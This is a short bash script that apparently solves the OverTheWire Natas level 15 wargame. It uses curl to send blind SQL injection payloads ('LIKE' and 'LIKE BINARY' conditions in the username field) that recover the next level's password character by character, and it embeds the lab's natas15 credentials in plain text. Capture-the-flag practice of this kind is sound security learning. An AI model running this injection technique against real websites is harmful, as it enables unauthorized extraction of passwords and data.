#!/bin/bash

val=$1
done=false
for char in {a..z}; do
	response=$(curl -s -u natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx "http://natas15.natas.labs.overthewire.org/?username=natas16%22+and+password+LIKE%22$val$char%25&debug")
	if [[ "$response" == *"This user exists"* ]]; then
    		response=$(curl -s -u natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx "http://natas15.natas.labs.overthewire.org/?username=natas16%22+and+password+LIKE+BINARY+%22$val$char%25&debug")
		if [[ "$response" == *"This user exists"* ]]; then
			echo $char
		else
			echo "$char" | tr '[:lower:]' '[:upper:]'
		fi
		done=true
		break
	fi
done
for char in {0..9}; do
	if [[ $done == false ]]; then
        	response=$(curl -s -u natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx "http://natas15.natas.labs.overthewire.org/?username=natas16%22+and+password+LIKE+BINARY+%22$val$char%25&debug")
        	if [[ "$response" == *"This user exists"* ]]; then
          		echo $char
                	break
		fi
        fi
done
